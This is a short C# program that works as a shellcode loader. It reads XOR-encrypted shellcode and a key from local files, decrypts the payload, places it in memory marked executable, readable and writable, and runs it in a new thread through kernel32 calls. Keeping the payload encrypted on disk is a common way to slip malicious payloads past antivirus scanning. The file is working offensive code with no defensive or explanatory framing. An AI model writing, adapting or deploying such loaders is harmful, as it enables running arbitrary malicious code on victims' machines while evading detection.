using System;
using System.IO;
using System.Runtime.InteropServices;

class Program
{
	[DllImport("kernel32.dll", SetLastError=true,ExactSpelling=true)]
	static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
	
	[DllImport("kernel32.dll", SetLastError=true)]
	static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
	
	[DllImport("kernel32.dll")]
	static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
	
	const uint MEM_COMMIT=0x1000;
	const uint MEM_RESERVE=0x2000;
	const uint PAGE_EXECUTE_READWRITE= 0x40;
	const uint INFINITE= 0xFFFFFFFF;
	
	static void Main(string[] args)
	{
		//read encrypted shellcode from file
		byte[] encryptedShellcode= File.ReadAllBytes("encrypted_shellcode.bin");
		
		//read key from file
		byte[]key=File.ReadAllBytes("key.bin");
		
		//perform XOR decryption
		byte[] buf=new byte[encryptedShellcode.Length];
		for(int i=0;i<encryptedShellcode.Length;i++)
		{
			buf[i]=(byte)(encryptedShellcode[i] ^ key [i%key.Length]);
		}
		
		
		IntPtr mem= VirtualAlloc(IntPtr.Zero, (uint)buf.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if(mem==IntPtr.Zero){
			Console.WriteLine("Failed to allocate memory");
			return;
		}
		
		Marshal.Copy(buf, 0, mem, buf.Length);
		
		IntPtr thread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
		if(thread == IntPtr.Zero){
			Console.WriteLine("Failed to create thread");
			return;
		}
		
		WaitForSingleObject(thread, INFINITE);}
}
